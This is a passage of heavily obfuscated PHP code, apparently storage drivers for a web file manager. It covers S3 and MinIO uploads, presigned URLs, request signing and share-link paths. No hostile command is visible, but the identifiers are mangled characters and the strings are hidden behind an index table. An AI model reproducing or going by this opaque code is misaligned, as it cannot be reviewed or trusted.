¤Î˜åÔ); if (!$Èš»›Â¨) { return !1; } if ($’“¸Ò¬) { return !0; } return $Èš»›Â¨ ? !0 : !1; } public function fileSubstr($†®ˆ¬ª, $£ÓÒ›Ë½, $÷–Ä«¦Ü) { $œÄì‰Ïù = $£ÓÒ›Ë½ + $÷–Ä«¦Ü - 1; return $this->client->getObject($this->bucket, $†®ˆ¬ª, array($_SERVER[ˆö¿ÚÌ¼][247] => "\142\x79\x74\x65\163\x3d{$£ÓÒ›Ë½}\55{$œÄì‰Ïù}")); } public function upload($ğŠ¦Ù¿è, $”Ÿ²ò©ê, $‹ÏìüÇ = false, $§Êç€ä­ = REPEAT_REPLACE) { $©¥šÏ™Ø =& $_SERVER[ˆö¿ÚÌ¼]; $Âùƒá = array($©¥šÏ™Ø[248] => @md5_file($”Ÿ²ò©ê)); $‚¢•Û = array($©¥šÏ™Ø[249] => get_file_mime(get_path_ext($ğŠ¦Ù¿è))); if (IO::size($”Ÿ²ò©ê) <= 1024 * 1024 * 200) { $ÏëÀÜ¡‰ = $this->client->putObjectFile($”Ÿ²ò©ê, $this->bucket, $ğŠ¦Ù¿è, $©¥šÏ™Ø[232], $Âùƒá, $‚¢•Û); return !empty($ÏëÀÜ¡‰) ? $this->getPathOuter($ğŠ¦Ù¿è) : !1; } $¼¸¿ÏÇ› = $this->client->multiUploadObject($”Ÿ²ò©ê, $this->bucket, trim($ğŠ¦Ù¿è, $©¥šÏ™Ø[8]), $Âùƒá, $‚¢•Û); return $¼¸¿ÏÇ› ? $this->getPathOuter($ğŠ¦Ù¿è) : !1; } public function download($ë”Ò¨ú, $øœÄ¹‘û) { if (!@is_dir($this->pathFather($øœÄ¹‘û)) && !IO::mkdir($this->pathFather($øœÄ¹‘û))) { return !1; } $©Ç´Ø¿˜ = $this->client->getObject($this->bucket, $ë”Ò¨ú, array(), $øœÄ¹‘û); return $©Ç´Ø¿˜ !== !1 ? $øœÄ¹‘û : !1; } public function link($ÄìºÎĞ½, $Ä—©êŸĞ = array()) { return $this->getPreSignedURL($ÄìºÎĞ½, 3600 * 12, $Ä—©êŸĞ); } private function getPreSignedURL($¹¡ò’Õ, $êÒÏ ü, $Ş‡êôæ = array(), $Ù†½×¤ = "\107\x45\x54") { $Ÿœ¸¢ú =& $_SERVER[ˆö¿ÚÌ¼]; $¹¡ò’Õ = trim($¹¡ò’Õ, $Ÿœ¸¢ú[8]); if ($this->signVer == $Ÿœ¸¢ú[250]) { return $this->client->getPreSignedV2URL($this->bucket, $¹¡ò’Õ, $êÒÏ ü, $Ù†½×¤, $Ş‡êôæ); } return $this->client->getPreSignedV4URL($this->bucket, $¹¡ò’Õ, $êÒÏ ü, array(), $Ù†½×¤, $Ş‡êôæ); } public function fileOut($œŸØï¸Ï, $Ü¯°ÛĞÖ = false, $¨ŠÀ»ÜØ = false, $®éä‹ = '') { $Œƒ¬èá =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->isFileOutServer()) { return $this->fileOutServer($œŸØï¸Ï, $Ü¯°ÛĞÖ, $¨ŠÀ»ÜØ, $®éä‹); } if (!$¨ŠÀ»ÜØ) { $¨ŠÀ»ÜØ = $this->pathThis($œŸØï¸Ï); } $»Ÿ·Øæû = get_file_mime(get_path_ext($¨ŠÀ»ÜØ)); if ($»Ÿ·Øæû == $Œƒ¬èá[251]) { return parent::fileOut($œŸØï¸Ï, $Ü¯°ÛĞÖ, $¨ŠÀ»ÜØ, $®éä‹); } $ĞÒ°¸Å¶ = array($Œƒ¬èá[252] => $»Ÿ·Øæû); if ($Ü¯°ÛĞÖ) { $ĞÒ°¸Å¶[$Œƒ¬èá[253]] = $Œƒ¬èá[254] . rawurlencode($¨ŠÀ»ÜØ); } else { } $ù˜ÍóÜ» = $this->link($œŸØï¸Ï, $ĞÒ°¸Å¶); $this->fileOutLink($ù˜ÍóÜ»); } public function fileOutServer($¦„ÎêŸ, $Ÿ×ş§’ = false, $úİ¢ú²‘ = false, $ù¹Ûêı = '') { parent::fileOut($¦„ÎêŸ, $Ÿ×ş§’, $úİ¢ú²‘, $ù¹Ûêı); } public function fileOutImageServer($û…÷¹ë³, $Ñ—Ã¯ = 250) { parent::fileOutImage($û…÷¹ë³, $Ñ—Ã¯); } public function hashMd5($“¼«¢ó“, $«ÂÎÓ = '') { $¼êİäƒ” = $this->objectMeta($“¼«¢ó“); if (!$¼êİäƒ”) { return !1; } $«ÂÎÓ = $«ÂÎÓ ? $«ÂÎÓ : _get($¼êİäƒ”, $_SERVER[ˆö¿ÚÌ¼][255]); return $«ÂÎÓ; } public function uploadFormData($Éëè†œ±, $©¯¬¨Óû = 3600) { $Ê†Ÿ¸ÛÀ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->_isClientAsync()) { $Á¿²Î›† = $this->getPreSignedURL($Éëè†œ±, $©¯¬¨Óû, array(), $Ê†Ÿ¸ÛÀ[256]); return array($Ê†Ÿ¸ÛÀ[209] => str_replace($Ê†Ÿ¸ÛÀ[219], $Ê†Ÿ¸ÛÀ[257], $Á¿²Î›†)); } if (isset($GLOBALS[$Ê†Ÿ¸ÛÀ[6]][$Ê†Ÿ¸ÛÀ[92]][$Ê†Ÿ¸ÛÀ[258]]) && $GLOBALS[$Ê†Ÿ¸ÛÀ[6]][$Ê†Ÿ¸ÛÀ[92]][$Ê†Ÿ¸ÛÀ[258]] == $Ê†Ÿ¸ÛÀ[231]) { return $this->uploadMultiData($Éëè†œ±, $©¯¬¨Óû); } if ($this->signVer == $Ê†Ÿ¸ÛÀ[250]) { return $this->uploadFormDataV2($Éëè†œ±, $©¯¬¨Óû); } return $this->uploadFormDataV4($Éëè†œ±, $©¯¬¨Óû); } public function uploadFormDataV2($£­°»’Â, $¾…É¿Çâ = 3600) { $í‘úº  =& $_SERVER[ˆö¿ÚÌ¼]; $ìãá¶ = $this->pathFather($£­°»’Â); $Á…üÏ = $this->client->getHttpUploadPostParams($this->bucket, $ìãá¶, $í‘úº [232], $¾…É¿Çâ); $ÇŸùĞÄû = array_merge((array) $Á…üÏ, array($í‘úº [259] => $í‘úº [250], $í‘úº [209] => $this->getHost())); if ($this->_isClientAsync()) { unset($ÇŸùĞÄû[$í‘úº [259]]); } return $ÇŸùĞÄû; } public function uploadFormDataV4($Ë§º¡§², $‰ûÄ¹èÌ = 3600) { $¬Œ¡œŞŸ =& $_SERVER[ˆö¿ÚÌ¼]; $ëÓîû•Ÿ = $¬Œ¡œŞŸ[232]; $ƒÆ÷ôÄ… = $¬Œ¡œŞŸ[260]; $ü¦İÊÌÜ = $¬Œ¡œŞŸ[62]; $™¨ÚŸó¹ = gmdate($¬Œ¡œŞŸ[261]); $Ü£¬šô = gmdate($¬Œ¡œŞŸ[262]); $‡íğÅ£¥ = $¬Œ¡œŞŸ[263]; $İ½¡¤äÕ = $‰ûÄ¹èÌ . $¬Œ¡œŞŸ[12]; $Š˜ëàÄ‚ = $¬Œ¡œŞŸ[264]; $èËµÌƒ“ = array($this->accessKey, $Ü£¬šô, $this->region, $ü¦İÊÌÜ, $‡íğÅ£¥); $¶ûÓúŸş = implode($¬Œ¡œŞŸ[8], $èËµÌƒ“); $Âı•À· = array($¬Œ¡œŞŸ[265] => gmdate($¬Œ¡œŞŸ[266], strtotime($¬Œ¡œŞŸ[267])), $¬Œ¡œŞŸ[268] => array(array($¬Œ¡œŞŸ[269] => $this->bucket), array($¬Œ¡œŞŸ[270], $¬Œ¡œŞŸ[271], $¬Œ¡œŞŸ[12]), array($¬Œ¡œŞŸ[270], $¬Œ¡œŞŸ[272], $¬Œ¡œŞŸ[12]), array($¬Œ¡œŞŸ[273] => $Š˜ëàÄ‚), array($¬Œ¡œŞŸ[274] => $¶ûÓúŸş), array($¬Œ¡œŞŸ[275] => $ƒÆ÷ôÄ…), array($¬Œ¡œŞŸ[276] => $™¨ÚŸó¹), array($¬Œ¡œŞŸ[277] => $İ½¡¤äÕ))); $á§À¼°· = base64_encode(json_encode($Âı•À·)); $Íæ™Ã”¾ = hash_hmac($¬Œ¡œŞŸ[278], $Ü£¬šô, $¬Œ¡œŞŸ[279] . $this->secret, !0); $ÈóÍ¨œŸ = hash_hmac($¬Œ¡œŞŸ[278], $this->region, $Íæ™Ã”¾, !0); $±›ô™ÈÏ = hash_hmac($¬Œ¡œŞŸ[278], $ü¦İÊÌÜ, $ÈóÍ¨œŸ, !0); $¼€‘Â˜ = hash_hmac($¬Œ¡œŞŸ[278], $‡íğÅ£¥, $±›ô™ÈÏ, !0); $ü—›ûáå = hash_hmac($¬Œ¡œŞŸ[278], $á§À¼°·, $¼€‘Â˜); $ç™ğ†‘À = array($¬Œ¡œŞŸ[249] => $¬Œ¡œŞŸ[12], $¬Œ¡œŞŸ[273] => $Š˜ëàÄ‚, $¬Œ¡œŞŸ[280] => $á§À¼°·, $¬Œ¡œŞŸ[274] => $¶ûÓúŸş, $¬Œ¡œŞŸ[275] => $ƒÆ÷ôÄ…, $¬Œ¡œŞŸ[276] => $™¨ÚŸó¹, $¬Œ¡œŞŸ[277] => $İ½¡¤äÕ, $¬Œ¡œŞŸ[281] => $ü—›ûáå, $¬Œ¡œŞŸ[259] => $¬Œ¡œŞŸ[250], $¬Œ¡œŞŸ[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($ç™ğ†‘À[$¬Œ¡œŞŸ[259]]); } return $ç™ğ†‘À; } public function uploadMultiData($ŠÃ¼ù­Õ, $šæÍŠÄ» = 3600) { $µ¹ ï =& $_SERVER[ˆö¿ÚÌ¼]; $ªòìš“ = $this->signVer == $µ¹ ï[250] ? gmdate($µ¹ ï[282]) : gmdate($µ¹ ï[283]); $åÑë¸© = array(); $·†ıÍ†Õ = $this->client->getUploadId($this->bucket, $ŠÃ¼ù­Õ, $åÑë¸©); if (!$·†ıÍ†Õ) { return !1; } $‰İ”Ú © = array($µ¹ ï[284] => $·†ıÍ†Õ, $µ¹ ï[209] => $this->getHost() . $µ¹ ï[8] . $this->pathEncode($ŠÃ¼ù­Õ), $µ¹ ï[285] => $ªòìš“, $µ¹ ï[97] => $ŠÃ¼ù­Õ, $µ¹ ï[259] => $this->signVer); if ($this->_isClientAsync()) { unset($‰İ”Ú ©[$µ¹ ï[259]]); } return $‰İ”Ú ©; } public function uploadMultiAuth($¿Ø‹·ä¨, $–¸Ú·”ê = array()) { $à®ûÛá =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->signVer == $à®ûÛá[250]) { if (isset($–¸Ú·”ê[$à®ûÛá[286]])) { return $this->uploadPartAuthV2($¿Ø‹·ä¨, $–¸Ú·”ê); } return $this->uploadListAuthV2($¿Ø‹·ä¨, $–¸Ú·”ê); } if (isset($–¸Ú·”ê[$à®ûÛá[286]])) { return $this->uploadPartAuthV4($¿Ø‹·ä¨, $–¸Ú·”ê); } return $this->uploadListAuthV4($¿Ø‹·ä¨, $–¸Ú·”ê); } public function uploadPartAuthV2($–Ïœ´‰ë, $”Ï¹ığ» = array()) { $ØõóÍ¶ =& $_SERVER[ˆö¿ÚÌ¼]; $è·çÈéı = $”Ï¹ığ»[$ØõóÍ¶[97]]; $ı÷â¤£Œ = gmdate($ØõóÍ¶[282]); $Şú¨øŸ’ = array_intersect_key($”Ï¹ığ», array_flip(array($ØõóÍ¶[286], $ØõóÍ¶[284]))); ksort($Şú¨øŸ’); $ì´¹Ô¯† = $Şú¨øŸ’ ? $ØõóÍ¶[76] . http_build_query($Şú¨øŸ’, null, $ØõóÍ¶[287], PHP_QUERY_RFC3986) : $ØõóÍ¶[12]; $ŸºŸèÌ = array($ØõóÍ¶[256], $ØõóÍ¶[12], $ØõóÍ¶[123], $ØõóÍ¶[12], "\x78\55\141\155\x7a\55\x64\x61\164\145\72{$ı÷â¤£Œ}", $ØõóÍ¶[8] . $this->bucket . $ØõóÍ¶[8] . $this->pathEncode($è·çÈéı) . $ì´¹Ô¯†); $‰÷—ñù = implode($ØõóÍ¶[288], $ŸºŸèÌ); $ÆĞ…ƒ³ = $this->client->__getSignature($‰÷—ñù); return array($ØõóÍ¶[289] => $ÆĞ…ƒ³, $ØõóÍ¶[285] => $ı÷â¤£Œ); } public function uploadListAuthV2($å“”ØÒ, $î¶“•†æ = array()) { $¶€õšŞı =& $_SERVER[ˆö¿ÚÌ¼]; $ØŸŠé¡À = $î¶“•†æ[$¶€õšŞı[97]]; $Ÿ–ÔˆÚ® = $î¶“•†æ[$¶€õšŞı[284]]; $ßàÎ×ÁË = $this->client->listParts($this->bucket, $ØŸŠé¡À, $Ÿ–ÔˆÚ®); if (!$ßàÎ×ÁË) { return !1; } $²àíùÖ¼ = gmdate($¶€õšŞı[282]); $µú’¹ = $¶€õšŞı[290] . $Ÿ–ÔˆÚ®; $æÑ²ã“´ = array($¶€õšŞı[291], $¶€õšŞı[12], $¶€õšŞı[123], $¶€õšŞı[12], "\170\x2d\141\155\x7a\x2d\x64\141\164\145\72{$²àíùÖ¼}", $¶€õšŞı[8] . $this->bucket . $¶€õšŞı[8] . $this->pathEncode($ØŸŠé¡À) . $µú’¹); $Ÿû–Ùù¢ = implode($¶€õšŞı[288], $æÑ²ã“´); $õ¬½éÄ… = $this->client->__getSignature($Ÿû–Ùù¢); return array($¶€õšŞı[289] => $õ¬½éÄ…, $¶€õšŞı[285] => $²àíùÖ¼, $¶€õšŞı[292] => $ßàÎ×ÁË); } public function uploadPartAuthV4($Ÿê‡ûÀ†, $½‘¾ßšì = array()) { $’•†±ï =& $_SERVER[ˆö¿ÚÌ¼]; $¨Ê¶İ‚Ó = $½‘¾ßšì[$’•†±ï[97]]; $Ò¨çÁì = array($’•†±ï[276] => gmdate($’•†±ï[283]), $’•†±ï[293] => _get($½‘¾ßšì, $’•†±ï[294], hash($’•†±ï[278], $’•†±ï[12]))); $šãÄ©Ë´ = explode($’•†±ï[211], $this->getHost()); $ÁêÜı­ñ = array($’•†±ï[295] => $šãÄ©Ë´[1], $’•†±ï[296] => $’•†±ï[12], $’•†±ï[249] => $’•†±ï[123], $’•†±ï[297] => $½‘¾ßšì[$’•†±ï[79]]); $îøøØıÕ = $’•†±ï[256]; $¿Ñ»Öëş = $’•†±ï[8] . $this->pathEncode($¨Ê¶İ‚Ó); $¹Ì £“¹ = array_intersect_key($½‘¾ßšì, array_flip(array($’•†±ï[286], $’•†±ï[284]))); $§‰­æª¡ = $this->client->__getSignatureV4($Ò¨çÁì, $ÁêÜı­ñ, $îøøØıÕ, $¿Ñ»Öëş, $¹Ì £“¹); return array($’•†±ï[289] => $§‰­æª¡, $’•†±ï[293] => $Ò¨çÁì[$’•†±ï[293]], $’•†±ï[285] => $Ò¨çÁì[$’•†±ï[276]]); } public function uploadListAuthV4($ú§ äâŠ, $ÁË°¡ÇÚ = array()) { $¡ôóË¿À =& $_SERVER[ˆö¿ÚÌ¼]; $¯››™†­ = $ÁË°¡ÇÚ[$¡ôóË¿À[97]]; $½ï»£òæ = $ÁË°¡ÇÚ[$¡ôóË¿À[284]]; $©¼éø±á = $this->client->listParts($this->bucket, $¯››™†­, $½ï»£òæ); if (!$©¼éø±á) { return !1; } $ ×É†ı´ = $¡ôóË¿À[298]; foreach ($©¼éø±á as $Œ¶Ë÷ş) { $ ×É†ı´ .= $¡ôóË¿À[299] . "\x3c\120\141\x72\164\x4e\x75\155\142\145\162\76{$Œ¶Ë÷ş[$¡ôóË¿À[300]]}\74\57\x50\x61\162\x74\116\165\x6d\x62\x65\162\x3e\xa" . "\x3c\105\124\x61\x67\76{$Œ¶Ë÷ş[$¡ôóË¿À[301]]}\x3c\57\105\124\141\147\76\xa" . $¡ôóË¿À[302]; } $ ×É†ı´ .= $¡ôóË¿À[303]; $“Á„Ì‡Ö = array($¡ôóË¿À[276] => gmdate($¡ôóË¿À[283]), $¡ôóË¿À[293] => hash($¡ôóË¿À[278], $ ×É†ı´)); $Ì›•„îÀ = explode($¡ôóË¿À[211], $this->getHost()); $‰ÇßôÅÓ = array($¡ôóË¿À[295] => $Ì›•„îÀ[1], $¡ôóË¿À[249] => $¡ôóË¿À[123], $¡ôóË¿À[297] => strlen($ ×É†ı´)); $ß’»ÀƒÃ = $¡ôóË¿À[291]; $Ø—±úª¥ = $¡ôóË¿À[8] . $this->pathEncode($¯››™†­); $­õşù¯î = array($¡ôóË¿À[284] => $½ï»£òæ); $¢”¦Ş«æ = $this->client->__getSignatureV4($“Á„Ì‡Ö, $‰ÇßôÅÓ, $ß’»ÀƒÃ, $Ø—±úª¥, $­õşù¯î); return array($¡ôóË¿À[289] => $¢”¦Ş«æ, $¡ôóË¿À[293] => $“Á„Ì‡Ö[$¡ôóË¿À[293]], $¡ôóË¿À[285] => $“Á„Ì‡Ö[$¡ôóË¿À[276]], $¡ôóË¿À[292] => $©¼éø±á); } private function _isClientAsync() { $¿¢ğ½»å =& $_SERVER[ˆö¿ÚÌ¼]; static $†è×†Æ˜ = null; if ($†è×†Æ˜ === null) { $¬‘ø—ì× = isset($_REQUEST[$¿¢ğ½»å[304]]) ? json_decode($_REQUEST[$¿¢ğ½»å[304]], !0) : !1; $†è×†Æ˜ = $¬‘ø—ì× && _get($¬‘ø—ì×, $¿¢ğ½»å[305]) == $¿¢ğ½»å[306]; } return $†è×†Æ˜; } public function getHost() { $¸³ªÁûí =& $_SERVER[ˆö¿ÚÌ¼]; $¸¯§¥°Ğ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¸³ªÁûí[70], $¸³ªÁûí[64], $¸³ªÁûí[69], $¸³ªÁûí[62]))) { return $¸¯§¥°Ğ . $¸³ªÁûí[8] . $this->bucket; } if ($this->osType == $¸³ªÁûí[62] && !is_domain($¸¯§¥°Ğ)) { return $¸¯§¥°Ğ . $¸³ªÁûí[8] . $this->bucket; } $¸¯§¥°Ğ = explode($¸³ªÁûí[211], $¸¯§¥°Ğ); return $¸¯§¥°Ğ[0] . $¸³ªÁûí[211] . $this->bucket . $¸³ªÁûí[10] . $¸¯§¥°Ğ[1]; } public function size($¤É­“Ì) { $ñ—ŒÜœÛ = $this->objectMeta($¤É­“Ì); return $ñ—ŒÜœÛ ? $ñ—ŒÜœÛ[$_SERVER[ˆö¿ÚÌ¼][79]] : 0; } public function info($¯»×õÄë) { if ($this->isFolder($¯»×õÄë)) { return $this->folderInfo($¯»×õÄë); } else { if ($this->isFile($¯»×õÄë)) { return $this->fileInfo($¯»×õÄë); } } return !1; } public function exist($Ì€§åôÁ) { return $this->isFile($Ì€§åôÁ) || $this->isFolder($Ì€§åôÁ); } public function isFile($İ–†œŸ©) { return !$this->isFolder($İ–†œŸ©) && $this->objectMeta($İ–†œŸ©); } public function isFolder($®·Í½ì±) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][180], $®·Í½ì±); } protected function objectMeta($ôş÷€Ë§) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][182], $ôş÷€Ë§); } protected function _objectMeta($ÉœÖ§Ù) { $ñ«Ç± =& $_SERVER[ˆö¿ÚÌ¼]; $ÉœÖ§Ù = rtrim($ÉœÖ§Ù, $ñ«Ç±[8]); try { $™¹õ¸¢• = $this->client->getObjectInfo($this->bucket, $ÉœÖ§Ù); if (!isset($™¹õ¸¢•[$ñ«Ç±[255]]) && isset($™¹õ¸¢•[$ñ«Ç±[307]])) { $™¹õ¸¢•[$ñ«Ç±[255]] = $™¹õ¸¢•[$ñ«Ç±[307]]; } } catch (Exception $¤êßµø‰) { $™¹õ¸¢• = !1; } if (!$™¹õ¸¢•) { } return $™¹õ¸¢•; } protected function _isFolder($ùöúª˜–) { $××Ì×ˆ =& $_SERVER[ˆö¿ÚÌ¼]; $ùöúª˜– = rtrim($ùöúª˜–, $××Ì×ˆ[8]) . $××Ì×ˆ[8]; if ($ùöúª˜– == $××Ì×ˆ[12] || $ùöúª˜– == $××Ì×ˆ[8]) { return !0; } $›æÃ°Š¼ = $this->client->getBucket($this->bucket, $ùöúª˜–, null, 1); if (empty($›æÃ°Š¼[$××Ì×ˆ[239]])) { return !1; } $ÍúúÑ¤ = $›æÃ°Š¼[$××Ì×ˆ[239]][0][$××Ì×ˆ[32]]; return stripos($ÍúúÑ¤, $ùöúª˜–) === 0 ? !0 : !1; if (substr($ÍúúÑ¤, -1) == $××Ì×ˆ[8]) { return !0; } if (get_path_this($ÍúúÑ¤) == get_path_this($ùöúª˜–)) { return !1; } return !0; } public function listObject($¡˜¢ü¹ô) { return $this->fileList($¡˜¢ü¹ô, $_SERVER[ˆö¿ÚÌ¼][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($â›ÀÅ±³) { $úŠ˜‡ß¶ =& $_SERVER[ˆö¿ÚÌ¼]; parent::__construct($â›ÀÅ±³); $this->setSignVersion($úŠ˜‡ß¶[250]); if (!$this->region) { $this->region = $úŠ˜‡ß¶[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $×«‚¯ÚŞ = $this->getBktRegion(); return $this->region == $×«‚¯ÚŞ ? !0 : !1; } public function uploadFormData($„ªßº†´, $×Œİ«­º = 3600) { $åˆÌ—é¨ =& $_SERVER[ˆö¿ÚÌ¼]; $ñÒÛ€…İ = $åˆÌ—é¨[232]; $£Ü³×»¨ = $åˆÌ—é¨[260]; $ÜÈú¦ÄÃ = $åˆÌ—é¨[62]; $ÛŒ”‰˜ = gmdate($åˆÌ—é¨[261]); $¡»ŸÇ„º = gmdate($åˆÌ—é¨[262]); $½ ëùè = $åˆÌ—é¨[263]; $†©ÙÍÆ” = $×Œİ«­º . $åˆÌ—é¨[12]; $Ó¢Åß— = $åˆÌ—é¨[264]; $¯™Ş‰ıë = array($this->accessKey, $¡»ŸÇ„º, $this->region, $ÜÈú¦ÄÃ, $½ ëùè); $É®­·™¯ = implode($åˆÌ—é¨[8], $¯™Ş‰ıë); $ıÜö©¥‚ = array($åˆÌ—é¨[265] => gmdate($åˆÌ—é¨[266], strtotime($åˆÌ—é¨[267])), $åˆÌ—é¨[268] => array(array($åˆÌ—é¨[269] => $this->bucket), array($åˆÌ—é¨[309] => $ñÒÛ€…İ), array($åˆÌ—é¨[270], $åˆÌ—é¨[271], $åˆÌ—é¨[12]), array($åˆÌ—é¨[270], $åˆÌ—é¨[272], $åˆÌ—é¨[12]), array($åˆÌ—é¨[270], $åˆÌ—é¨[310], $åˆÌ—é¨[12]), array($åˆÌ—é¨[273] => $Ó¢Åß—), array($åˆÌ—é¨[274] => $É®­·™¯), array($åˆÌ—é¨[275] => $£Ü³×»¨), array($åˆÌ—é¨[276] => $ÛŒ”‰˜), array($åˆÌ—é¨[277] => $†©ÙÍÆ”))); $†‰®×«„ = base64_encode(json_encode($ıÜö©¥‚)); $¦™Ëıú¬ = hash_hmac($åˆÌ—é¨[278], $¡»ŸÇ„º, $åˆÌ—é¨[279] . $this->secret, !0); $ëé³ŞÊõ = hash_hmac($åˆÌ—é¨[278], $this->region, $¦™Ëıú¬, !0); $–å°µ¨• = hash_hmac($åˆÌ—é¨[278], $ÜÈú¦ÄÃ, $ëé³ŞÊõ, !0); $’§êüƒ© = hash_hmac($åˆÌ—é¨[278], $½ ëùè, $–å°µ¨•, !0); $ŸíÂÀíõ = hash_hmac($åˆÌ—é¨[278], $†‰®×«„, $’§êüƒ©); $ùÂş“‰± = array($åˆÌ—é¨[249] => $åˆÌ—é¨[12], $åˆÌ—é¨[297] => $åˆÌ—é¨[12], $åˆÌ—é¨[309] => $ñÒÛ€…İ, $åˆÌ—é¨[273] => $Ó¢Åß—, $åˆÌ—é¨[280] => $†‰®×«„, $åˆÌ—é¨[311] => $É®­·™¯, $åˆÌ—é¨[312] => $£Ü³×»¨, $åˆÌ—é¨[313] => $ÛŒ”‰˜, $åˆÌ—é¨[314] => $†©ÙÍÆ”, $åˆÌ—é¨[315] => $ŸíÂÀíõ, $åˆÌ—é¨[209] => $this->getHost()); return $ùÂş“‰±; } } goto d‹Æ„›©Š§; c®Ñ‘¦šÁ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($“Çü€ÛÁ) { $this->pathParse = $“Çü€ÛÁ; $this->model = Model($_SERVER[ˆö¿ÚÌ¼][1435]); } public function getPathOuter($ìñéö²Å) { $èäÆÑš¯ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ìñéö²Å) { return $ìñéö²Å; } $è÷–ßÌã = $this->parse($ìñéö²Å); return trim(KodIO::makeShare($this->pathParse[$èäÆÑš¯[478]], $è÷–ßÌã[$èäÆÑš¯[478]]), $èäÆÑš¯[8]); } protected function infoParse($ê©­—ßä, $«Áˆşìú = false, $ÌŸè¦Âı = false) { $Šü›ÃÂª =& $_SERVER[ˆö¿ÚÌ¼]; $Õë˜Ğ–Ï = $this->pathParse[$Šü›ÃÂª[478]]; $ÚÉçÂËÉ = trim($this->pathParse[$Šü›ÃÂª[1264]], $Šü›ÃÂª[8]); return Action($Šü›ÃÂª[1442])->sharePathInfo($Õë˜Ğ–Ï, $ÚÉçÂËÉ, $«Áˆşìú); } public function infoFull($Í’•’¡) { $Òïñ¢ì¤ =& $_SERVER[ˆö¿ÚÌ¼]; $œéúØ½’ = explode($Òïñ¢ì¤[8], trim($Í’•’¡, $Òïñ¢ì¤[8])); if (count($œéúØ½’) > 1) { $ÎÁ¹´Ñ = implode($Òïñ¢ì¤[8], array_splice($œéúØ½’, 1)); $šöĞ² = $this->model->pathInfoByPath($œéúØ½’[0], $ÎÁ¹´Ñ); if (!$šöĞ²) { return !1; } $this->pathParse[$Òïñ¢ì¤[1264]] = $šöĞ²[$Òïñ¢ì¤[194]]; } return $this->infoParse($Í’•’¡); } public function listAll($ã‘Ã‘¡ü) { $›ê­™• =& $_SERVER[ˆö¿ÚÌ¼]; $…éö®´× = IO::info($this->pathParse[$›ê­™•[87]]); if (!$…éö®´×) { return array(); } $˜ÃèØô = $this->model->listAll($ã‘Ã‘¡ü); $–®¤¢Î = Model($›ê­™•[681])->getInfo($…éö®´×[$›ê­™•[682]]); foreach ($˜ÃèØô as &$õş®ëè€) { check_abort(); $õş®ëè€[$›ê­™•[90]] = Action($›ê­™•[1442])->_shareItemeParse($õş®ëè€[$›ê­™•[90]], $–®¤¢Î); } unset($õş®ëè€); return $˜ÃèØô; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($‹‘ºË£º) { $this->pathParse = $‹‘ºË£º; $this->model = Model($_SERVER[ˆö¿ÚÌ¼][1435]); } protected function infoParse($çæ÷·ìÓ, $‡“øŒä = false, $ÅöÉ•õÆ = false) { $ÚÉÚ×¾™ =& $_SERVER[ˆö¿ÚÌ¼]; return Action($ÚÉÚ×¾™[1270])->sharePathInfo($this->pathParse[$ÚÉÚ×¾™[87]], !0, $‡“øŒä); } public function listPath($®ºÍœ¥¨, $úş¡µ„× = false) { $Ûë‰Ù =& $_SERVER[ˆö¿ÚÌ¼]; $Ö§Æôá© = parent::listPath($®ºÍœ¥¨, $úş¡µ„×); if (!$Ö§Æôá©) { return $Ö§Æôá©; } if (is_array($Ö§Æôá©[$Ûë‰Ù[1443]])) { $Ö§Æôá©[$Ûë‰Ù[1443]] = Action($Ûë‰Ù[1270])->shareItemInfo($Ö§Æôá©[$Ûë‰Ù[1443]]); } foreach ($Ö§Æôá© as $É”ä÷á => $éàùø‡) { if (!in_array($É”ä÷á, array($Ûë‰Ù[86], $Ûë‰Ù[85]))) { continue; } foreach ($éàùø‡ as $šû£¦¸š => $Ôæøâìà) { $Ö§Æôá©[$É”ä÷á][$šû£¦¸š] = Action($Ûë‰Ù[1270])->shareItemInfo($Ôæøâìà); } } return $Ö§Æôá©; } public function listAll($æ—ÖÄ¼à) { $­Öù¸®ˆ =& $_SERVER[ˆö¿ÚÌ¼]; $¶ù¼Úú = IO::info($this->pathParse[$­Öù¸®ˆ[87]]); if (!$¶ù¼Úú) { return array(); } $«±‹øÌ = $this->model->listAll($æ—ÖÄ¼à); foreach ($«±‹øÌ as &$â¤íç¥Ë) { $â¤íç¥Ë[$­Öù¸®ˆ[90]] = Action($­Öù¸®ˆ[1270])->shareItemInfo($â¤íç¥Ë[$­Öù¸®ˆ[90]]); } unset($â¤íç¥Ë); return $«±‹øÌ; } } class PathDriverDriverShareItem { public function __construct($Áı•—Á) { $this->pathParse = $Áı•—Á; } public function __call($ÍÔæŞ‚Ñ, $¢œ¸‘â) { $Ù£ğí»ù =& $_SERVER[ˆö¿ÚÌ¼]; if (method_exists($this, $ÍÔæŞ‚Ñ)) { return; } $¯ŒöòÅİ = call_user_func_array(array($Ù£ğí»ù[1444], $ÍÔæŞ‚Ñ), $¢œ¸‘â); $ö²‚Õ®„ = array($Ù£ğí»ù[1445], $Ù£ğí»ù[1446], $Ù£ğí»ù[1447], $Ù£ğí»ù[1448], $Ù£ğí»ù[635], $Ù£ğí»ù[637], $Ù£ğí»ù[1449], $Ù£ğí»ù[110], $Ù£ğí»ù[1450], $Ù£ğí»ù[1451]); if (in_array($ÍÔæŞ‚Ñ, $ö²‚Õ®„)) { $¯ŒöòÅİ = $this->getPathOuter($¯ŒöòÅİ); } return $¯ŒöòÅİ; } public function copy($¿«ÆÔ€‡, $æÓ¥¤Ñ, $×è»¶³ú = false, $¨¼Õ¯‘œ = false) { return $this->copyMove($¿«ÆÔ€‡, $æÓ¥¤Ñ, $×è»¶³ú, $_SERVER[ˆö¿ÚÌ¼][635], $¨¼Õ¯‘œ); } public function move($„à¾¢š§, $®·£­ú, $€ıïÕ = false, $ªâÅíàØ = false) { return $this->copyMove($„à¾¢š§, $®·£­ú, $€ıïÕ, $_SERVER[ˆö¿ÚÌ¼][637], $ªâÅíàØ); } private function copyMove($Î»˜ôŒ¢, $Ï·˜×´Ò, 